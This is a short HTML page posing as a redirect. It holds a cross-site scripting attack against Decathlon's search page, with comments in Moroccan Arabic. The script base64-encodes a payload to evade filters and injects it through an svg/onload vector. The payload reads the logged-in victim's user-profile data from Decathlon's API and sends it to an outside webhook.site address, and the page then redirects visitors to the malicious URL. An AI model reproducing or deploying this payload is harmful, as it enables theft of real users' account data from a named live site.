<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // 1. هاد الكود هو اللي غيتنفذ وسط Decathlon
        let code = "fetch('https://www.decathlon.com/api/v1/user/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(d)))";
        
        // 2. تشفير الكود باش يدوز من الفلتر
        let b64 = btoa(code);
        
        // 3. الرابط اللي فيه الثغرة (XSS)
        // استعملنا svg/onload حيت كيدوز من الـ Filters أحسن من <script>
        let xss_url = "https://www.decathlon.com/search?q=<svg/onload=eval(atob('" + b64 + "'))>";
        
        // 4. تنفيذ الـ Redirect
        window.location.href = xss_url;
    </script>
</body>
</html>
